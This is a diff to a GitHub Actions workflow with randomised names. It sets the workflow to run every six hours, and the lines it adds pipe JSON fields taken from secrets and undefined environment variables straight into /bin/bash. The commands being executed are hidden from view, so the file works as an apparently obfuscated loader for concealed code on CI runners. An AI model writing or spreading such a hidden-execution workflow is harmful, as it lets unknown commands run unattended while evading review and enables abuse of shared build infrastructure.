@@ -1,19 +1,26 @@
 name: wanyusui2314
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 3/6 * * *'
-jobs:  # 15333
+    - cron: '26 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wanyusui2314
         env:
-          hax8383: ${{ secrets.hax8383 }}
+          keuyg7362: ${{ secrets.keuyg7362 }}
         run: |
-          echo $hax8383 | jq -r .ql9 | /bin/bash
-          echo $fgkkc52966 | jq -r .xwo587 | /bin/bash
-          echo $a9622 | jq -r .dhd152 | /bin/bash
-          echo $yu3 | jq -r .lhe4650 | /bin/bash
+          echo $keuyg7362 | jq -r .pa022 | /bin/bash
+          echo $kchr54558 | jq -r .opzm39029 | /bin/bash
+          echo $s517 | jq -r .x92 | /bin/bash
+          echo $elb5 | jq -r .lszxi4427 | /bin/bash
+          echo $mlvb34 | jq -r .axvyg45 | /bin/bash
+          echo $rdw71 | jq -r .ov7716 | /bin/bash
+          echo $bbok13 | jq -r .q47 | /bin/bash
+          echo $tch58 | jq -r .uarle9279 | /bin/bash
 
